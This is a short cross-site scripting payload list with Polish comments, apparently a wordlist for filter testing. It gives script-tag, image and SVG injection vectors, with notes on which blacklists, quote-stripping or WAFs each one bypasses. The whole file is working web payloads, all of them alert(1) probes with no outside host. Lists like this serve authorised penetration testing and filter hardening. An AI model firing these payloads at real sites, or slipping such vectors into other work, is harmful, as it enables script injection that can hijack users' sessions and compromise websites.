# Unique marker do grep w response

# === Standard <script> ===
# Klasyczny — działa poza kontekstami sanitizowanymi
<script>alert(1)</script>
# Bez znaczników kończących — często wystarczy
<script>alert(1)//
# Self-closing wariant
<script/src=data:,alert(1)>

# === Image vectors ===
# Najpopularniejszy bypass <script> blacklisty
<img src=x onerror=alert(1)>
# Bez cudzysłowów (bypass quote-stripping)
<img src=x onerror=alert(1)//
# Z onload zamiast onerror
<img src=1 onload=alert(1)>

# === SVG vectors ===
# Bypass filtrów blokujących <script> i <img>
<svg onload=alert(1)>
# SVG z animacją (omija część WAF)
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
# SVG + script element wewnątrz
<svg><script>alert(1)</script></svg>
